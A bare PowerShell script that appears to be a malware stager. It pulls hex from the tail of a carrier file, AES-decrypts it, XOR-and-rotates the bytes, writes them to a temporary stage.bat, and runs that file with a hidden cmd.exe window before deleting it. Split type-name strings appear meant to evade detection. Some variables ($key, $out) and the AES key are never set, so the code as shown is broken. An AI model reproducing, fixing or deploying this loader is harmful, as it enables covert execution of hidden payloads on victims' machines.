$a = 'System.Wind' + 'ows'
$b = 'System.Diagnostics.Process' + 'StartInfo'
$lines = [System.IO.File]::ReadAllLines($env:CARRIER_PATH)
$hex = ($lines | Select -Last $env:LINE_COUNT) -replace '[^0-9a-fA-F]', ''
$enc = [Convert]::FromHexString($hex)
$aes = [System.Security.Cryptography.Aes]::Create()
$dec = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
for ($i = 0; $i -lt $dec.Length; $i++) {
    $k = $key[$i % $key.Length]; $r = $k -band 7; $x = [byte]($dec[$i] -bxor $k)
    $out[$i] = [byte](($x -shr $r) -bor (($x -shl (8 - $r)) -band 0xFF))
}
$tmp = Join-Path $env:TEMP 'stage.bat'
[System.IO.File]::WriteAllBytes($tmp, $out)
$psi = New-Object $b('cmd.exe', "/c $tmp")
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$proc = [System.Diagnostics.Process]::Start($psi)
$proc.WaitForExit()
Remove-Item $tmp -Force
